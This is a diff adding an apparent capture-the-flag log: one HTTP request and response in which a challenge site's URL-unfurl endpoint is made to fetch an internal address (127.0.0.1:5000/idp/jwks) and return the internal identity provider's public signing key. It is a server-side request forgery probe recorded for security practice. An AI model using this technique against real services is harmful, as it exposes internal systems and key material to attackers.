@@ -1,0 +1,14 @@
+# a JSON body: title empty, snippet is raw text, no XML parse
+GET http://meshgate-f1a5eea8fd01ddea.challs.ctf.thefewchosen.com/api/unfurl?url=http%3A%2F%2F127.0.0.1%3A5000%2Fidp%2Fjwks
+HTTP 200
+Content-Length: 333
+Content-Type: application/json
+Date: Sun, 06 Sep 2026 13:21:07 GMT
+Permissions-Policy: geolocation=(), microphone=(), camera=()
+Referrer-Policy: no-referrer
+Server: nginx
+Vary: Cookie
+X-Content-Type-Options: nosniff
+X-Frame-Options: DENY
+
+{"content_type":"application/json","snippet":"{\"keys\":[{\"alg\":\"RS256\",\"e\":\"AQAB\",\"kid\":\"meshgate-idp-2026\",\"kty\":\"RSA\",\"n\":\"2BXPduFqzIvPVAH_ZKVwYJRg1Vzos11mtJswVFHlMjCoqg3n6rl_bbQ2ByiB6pRDSESnK1mLKNhZMxF4INC3lzG8TeL1MgIjUvYcqLG7rYBoeM-U7UJ0JvTGTO","status":200,"title":"","url":"http://127.0.0.1:5000/idp/jwks"}
